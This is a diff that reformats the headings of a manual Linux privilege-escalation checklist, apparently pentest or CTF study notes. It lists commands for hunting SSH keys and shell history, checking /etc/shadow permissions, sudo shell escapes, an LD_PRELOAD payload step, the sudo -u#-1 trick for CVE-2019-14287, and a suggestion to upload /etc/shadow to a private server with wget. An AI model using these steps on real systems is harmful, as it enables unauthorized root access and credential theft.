@@ -1,49 +1,49 @@
-# Manual Linux Privilege Escalation Checks
+# ***Manual Linux Privilege Escalation Checks***
 
-## [KERNEL EXPLOITS]
+## **[KERNEL EXPLOITS]**
 
 *An outdated kernel version may lead to easy wins.*
 
     uname -a
 
 
-## [PASSWORDS AND FILE PERMISSIONS]
+## **[PASSWORDS AND FILE PERMISSIONS]**
 
 *A password or sensitive file disclosure can give us important information.*
 
-### Stored Passwords
+### *Stored Passwords*
 
     history
     cat .bash_history
 
 
-### Weak File Permissions
+### *Weak File Permissions*
 
 Look for **read or write** permissions to `/etc/shadow`
 
 Look for **write** permission to `/etc/passwd`
 
 
-### SSH Keys
+### *SSH Keys*
 
     find / -name id_rsa 2>/dev/null
     find / -name authorized_keys 2>/dev/null
     
-## [SUDO]
+## **[SUDO]**
 
 *Abusing sudo to gain root.*
 
-### Sudo Shell Escaping
+### *Sudo Shell Escaping*
 
     sudo -l
 
 Shell escape using an exploitable binary using [GTFOBins](https://gtfobins.github.io/)
 
-### Intended Functionality
+### *Intended Functionality*
 
 Is there any intended functionality we can abuse from a sudo'able binary? Example: use `wget` to upload the `/etc/shadow` file to our private server?
 
-### `env_keep+=ENV_PRELOAD` is present
+### *`env_keep+=ENV_PRELOAD` is present*
 
 *We want to use the ENV_PRELOAD feature in order to preload a malicious payload.*
 
@@ -66,9 +66,9 @@ void _init() {
 
 3. Set LD_PRELOAD as shell.so : `sudo LD_PRELOAD=<PATH TO SHELL FILE> <ANY SUDO'ABLE COMMAND>`
 
-### Version Specific Exploits
+### *Version Specific Exploits*
 
-#### Abusing CVE-2019-14287 (sudo version <1.8.28)
+#### *Abusing CVE-2019-14287 (sudo version <1.8.28)*
 
 [CVE-2019-14287](https://www.exploit-db.com/exploits/47502) Comes in handy if we can sudo as any user, except root (`!root`).
 
@@ -76,7 +76,7 @@ void _init() {
 
 2. If the sudo version is below 1.8.28, use this command to run as root: `sudo -u#-1 <COMMAND>`
 
-#### Abusing CVE-2019-18634 (sudo version <1.8.26)
+#### *Abusing CVE-2019-18634 (sudo version <1.8.26)*
 [Exploit for CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634) 
 
 1. Check sudo version: `sudo -V`
@@ -85,6 +85,6 @@ void _init() {
 
 3. Run the exploit.
 
-## SUID
+## **SUID**
 
 WIP
